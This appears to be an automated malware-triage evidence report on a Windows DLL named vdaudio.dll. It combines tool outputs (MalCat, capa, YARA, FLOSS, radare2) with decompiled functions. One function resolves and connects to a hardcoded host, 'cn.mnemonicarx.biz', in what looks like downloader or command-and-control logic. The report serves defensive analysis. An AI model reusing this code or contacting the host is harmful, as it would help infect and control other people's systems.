## Tool evidence (stage=deep_dive, signal-prioritized)
<!-- stage: deep_dive | sha=1e9f21f514ee4793 | packaging=v6.1 -->

## MalCat evidence
  File: type=PE, architecture=X86, entropy=135, sha256=1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39
  Anomalies (4): DownloaderApiUsage (imports), ManyHighValueImmediates×2 (code), ManyUniqueImmediateBytes (code), NoChecksum (integrity)
  High-signal anomaly locations: ManyHighValueImmediates@2601,8408; ManyUniqueImmediateBytes@8408; NoChecksum@216
  Functions (15): sub_1000308d@9357, sub_10002974@7540, sub_10001431@2097, sub_10001e4b@4683, sub_10002b76@8054, gewayZ@8341, gewayX@8360, EntryPoint@10006, vdaudio@8386, jmp_user32.DestroyCursor@10238, jmp_user32.LoadMenuA@10244, jmp_user32.PtInRect@10250, jmp_user32.RegisterClassExA@10256, jmp_user32.ReplyMessage@10262, jmp_user32.CallWindowProcW@10268
  Top high-signal imports (score≥8, 1 of 28):
    [10] user32.DestroyCursor
  Mid-signal imports: ws2_32.recv, kernel32.DeleteFileA, kernel32.LoadLibraryExA, kernel32.GetModuleHandleW
  (low-signal/noise imports: 23 omitted)
  Strings/apis (16 total): NtQueryInformationFile, DeleteFileA, RtlGetProcessHeaps, GetModuleHandleW, SetTextColor, GetLastError, SetColorSpace, NtAlertThread, LoadLibraryExA, RegisterClassExA, SetWindowExtEx, CallWindowProcW, SetWorldTransform, NtReadFile, ExitProcess
  Strings (other, 75 items, omitted)
  Recovered structures (22): MZ, PE, OptionalHeader, Sections, kernel32.FT, user32.FT, ws2_32.FT, gdi32.FT, ntdll.FT, ImportTable, kernel32.OFT, user32.OFT, ws2_32.OFT, gdi32.OFT, ntdll.OFT
  Decompilations (3 top functions):
    ### 9357 (sub_1000308d, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

void __fastcall sub_1000308d(undefined4 param_1,int32_t *UNRECOVERED_JUMPTABLE)

{
    undefined uVar1;
    undefined4 in_EAX;
    int32_t unaff_EBP;
    undefined *unaff_ESI;
    
    *(unaff_EBP + -0x75) = *(unaff_EBP + -0x75) | UNRECOVERED_JUMPTABLE;
    in(UNRECOVERED_JUMPTABLE);
    uVar1 = *unaff_ESI;
    *(UNRECOVERED_JUMPTABLE + -1) = uVar1;
    *UNRECOVERED_JUMPTABLE = CONCAT31(in_EAX >> 8, uVar1) + 1;
    /* WARNING: Could not recover jumptable at 0x1000309e. Too many branches */
    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)();
    return;
}
```
    ### 7540 (sub_10002974, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_10002974(void)

{
    int32_t iVar1;
    uint32_t uVar2;
    undefined4 uVar3;
    int32_t iVar4;
    undefined *puVar5;
    undefined *puVar6;
    
    (*0x1000af5c)();
    10012552 = sub_100033b4();
    [0x0x10012588] = 1;
    [0x0x100126b4] = '\0';
    1001258c = 10012552;
    while (iVar1 = (*0x1000af34)("cn.mnemonicarx.biz"), iVar1 == 0) {
        if (([0x0x100126b4] != '\0') || ([0x0x10005181] != '\x02')) goto code_r0x10002b57;
        [0x0x100126b4] = '\x01';
    }
    10009891 = sub_10002b76();
    [0x0x100098a1] = 0x37721155;
    [0x0x1000988d] = 2;
    [0x0x1000989d] = 2;
    iVar1 = (*0x1000af68)();
    10005196 = '\0';
    iVar4 = 0;
    uVar2 = iVar1 + 0xf0U >> 10;
    while (0x3b < uVar2) {
        uVar2 = uVar2 - 0x3c;
        iVar4 = iVar4 + 1;
        if (iVar4 == 0x3c) {
            10005196 = 10005196 + '\x01';
            iVar4 = 0;
        }
    }
    [0x0x1000ae6e] = 0;
    puVar5 = 0x100033e4;
    puVar6 = 0x10005197;
    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
    }
    1000518f = [0x0x1000cd07];
    10005191 = [0x0x1000cd0b];
    10005195 = uVar2;
    [0x0x10005193] = 5;
    [0x0x1000988f] = 0x3500;
    [0x0x1000989f] = 0x3500;
    uVar3 = 0x1000988d;
    if (([0x0x10005181] != '\x02') || ([0x0x1000ae6d] == '\x01')) {
        uVar3 = 0x1000989d;
    }
    iVar1 = (*0x1000af58)([0x0x10012552], uVar3, 0x10);
    if (iVar1 == -1) {
        return;
    }
    [0x0x1000a1c7] = [0x0x1000a1c7] + '\x01';
    sub_100015d9([0x0x10012552], 0x10005183, 0x2c);
    (*0x1000af70)(0x36be, 0);
code_r0x10002b57:
    (*0x1000af4c)([0x0x10012552], 2);
    (*0x1000af50)([0x0x10012552]);
    return;
}
```
    ### 2097 (sub_10001431, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 __fastcall sub_10001431(undefined4 param_1,undefined4 param_2)

{
    uint32_t in_EAX;
    undefined4 uStack_54;
    undefined4 uStack_48;
    undefined4 uStack_34;
    uint32_t uStack_30;
    code *pcStack_2c;
    undefined4 uStack_24;
    undefined4 uStack_20;
    undefined4 uStack_18;
    undefined4 uStack_14;
    undefined4 uStack_10;
    undefined4 uStack_c;
    undefined4 uStack_8;
    
    uStack_34 = 0x30;
    pcStack_2c = sub_10001314;
    uStack_24 = 1;
    uStack_30 = in_EAX ^ 3;
    uStack_20 = [0x0x1000b95b];
    uStack_14 = 0xd;
    uStack_c = 0x10005027;
    uStack_8 = 0;
    uStack_18 = 0;
    uStack_10 = param_2;
    jmp_user32.RegisterClassExA(&uStack_34);
    jmp_user32.CallWindowProcW(uStack_54, 0x112, 0x13, 0, 0);
    return CONCAT44(0x158090f, uStack_48);
}
```

## capa evidence (8 total, showing top 8)
  All rules (8): execute anti-debugging instructions, receive data, set socket configuration, receive data on socket, create TCP socket, delete file, get file attributes, resolve function by parsing PE exports

## pe_imports (28 imports, 1 high-signal)
  load_library (LoadLibrary) [T1129]

## YARA matches (19)
  Rules: domain, IP, contains_base64, maldoc_find_kernel32_base_method_1, IsPE32, IsDLL, IsWindowsGUI, Borland_Delphi_40_additional, Microsoft_Visual_Cpp_v50v60_MFC, Borland_Delphi_30_additional, Borland_Delphi_30_, Borland_Delphi_Setup_Module, Borland_Delphi_40, Borland_Delphi_v40_v50, Borland_Delphi_v30, Borland_Delphi_DLL, SEH_Save, SEH_Init, Str_Win32_Winsock2_Library

## FLOSS strings (79 total)
  apis (16): LoadMenuA, RegisterClassExA, CallWindowProcW, DeleteFileA, ExitProcess, GetLastError, LoadLibraryExA, GetModuleHandleW, SetColorSpace, SetTextColor, SetWindowExtEx, SetWorldTransform
  (other strings, 62 items omitted)

## dotnet_analyze
  (not a .NET assembly)


## radare2 (pdf (disasm)) — 4 functions (asm)
  ### 0x10003316
```c
┌ 15: entry0 ();
│           0x10003316      55             push ebp
│           0x10003317      8bec           mov ebp, esp
│           0x10003319      83c4e8         add esp, 0xffffffe8
│           0x1000331c      a115500010     mov eax, dword [0x10005015] ; [0x10005015:4]=1
│           0x10003321      c9             leave
└           0x10003322      c20c00         ret 0xc
```
  ### 0x10002ca8
```c
┌ 19: sym.vdaudio.dll_gewayX ();
│           0x10002ca8      6a00           push 0
│           0x10002caa      6a10           push 0x10                   ; 16
│           0x10002cac      6857b90010     push 0x1000b957
│           0x10002cb1      50             push eax
│           0x10002cb2      51             push ecx
│           0x10002cb3      e8dc070000     call 0x10003494
│           0x10002cb8      48             dec eax
└           0x10002cb9      ffe1           jmp ecx
```
  ### 0x10002c95
```c
┌ 19: sym.vdaudio.dll_gewayZ ();
│           0x10002c95      6a00           push 0
│           0x10002c97      6a10           push 0x10                   ; 16
│           0x10002c99      6857b90010     push 0x1000b957
│           0x10002c9e      50             push eax
│           0x10002c9f      51             push ecx
│           0x10002ca0      e8ef070000     call 0x10003494
│           0x10002ca5      48             dec eax
└           0x10002ca6      ffe1           jmp ecx
```
  ### 0x10002cc2
```c
┌ 22: sym.vdaudio.dll_vdaudio ();
│           0x10002cc2      b8f0280010     mov eax, 0x100028f0
│           0x10002cc7      8d80e8030000   lea eax, [eax + 0x3e8]
│           0x10002ccd      ffd0           call eax
│           0x10002ccf      b8d5320010     mov eax, 0x100032d5
│           0x10002cd4      48             dec eax
│           0x10002cd5      ffd0           call eax
└           0x10002cd7      c3             ret
```

## UPX
  (not packed)


## xorsearch (1 candidates)
  Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r

<!-- evidence_assembler: used 8019/60000 chars across 9 tools -->